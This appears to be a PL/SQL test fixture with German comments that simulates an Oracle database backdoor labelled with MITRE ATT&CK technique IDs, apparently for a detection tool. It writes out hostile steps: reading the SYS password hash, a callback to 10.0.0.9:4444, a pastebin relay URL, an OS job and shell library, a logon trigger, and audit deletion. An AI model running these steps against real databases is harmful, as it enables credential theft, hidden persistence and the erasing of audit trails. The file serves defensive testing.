-- ---------------------------------------------------------------------
-- Beispieldatei fuer ACI - simulierte Backdoor mit MITRE-ATT&CK-Indikatoren.
-- Diese Datei dient ausschliesslich Demonstrations- und Testzwecken und
-- loest zahlreiche Angriffsindikatoren der Gruppe "Sicherheit" aus.
-- ---------------------------------------------------------------------

CREATE OR REPLACE PACKAGE BODY sys.standard_ext     -- T1505 Package-Backdoor
AS
  PROCEDURE install IS
    l_hash  VARCHAR2(100);
    l_url   VARCHAR2(200);
  BEGIN
    -- T1003 Credential Access - Hashes auslesen
    SELECT password INTO l_hash FROM sys.user$ WHERE name = 'SYS';

    -- T1098 Hash-Injektion ueber dynamisches SQL
    EXECUTE IMMEDIATE 'ALTER USER app IDENTIFIED BY VALUES ''S:ABCD1234''';

    -- T1564 Verstecken ueber undokumentierten Parameter
    EXECUTE IMMEDIATE 'ALTER SESSION SET "_oracle_script"=TRUE';

    -- T1059.007 JavaScript-Ausfuehrung
    DBMS_MLE.eval(l_ctx, 'javascript', 'fetch("http://x")');

    -- T1053 OS-Befehl ueber Scheduler-Job
    DBMS_SCHEDULER.create_job(job_name   => 'BD_JOB',
                              job_type   => 'EXECUTABLE',
                              job_action => '/tmp/collect.sh');

    -- T1071 C2 - ausgehende JDWP-Verbindung
    DBMS_DEBUG_JDWP.connect_tcp('10.0.0.9', 4444);

    -- T1102 hartkodierte Relay-URL
    l_url := 'http://pastebin.com/raw/abcd1234';

    -- T1070 Spuren beseitigen
    EXECUTE IMMEDIATE 'DELETE FROM sys.aud$';
    NOAUDIT ALL;
  END install;
END standard_ext;
/

-- T1546 Persistenz - datenbankweiter LOGON-Trigger
CREATE OR REPLACE TRIGGER bd_logon AFTER LOGON ON DATABASE
BEGIN
  NULL;
END;
/

-- T1059 externe Library (EXTPROC / OS-Code)
CREATE OR REPLACE LIBRARY shell_lib AS '/tmp/shell.so';
/
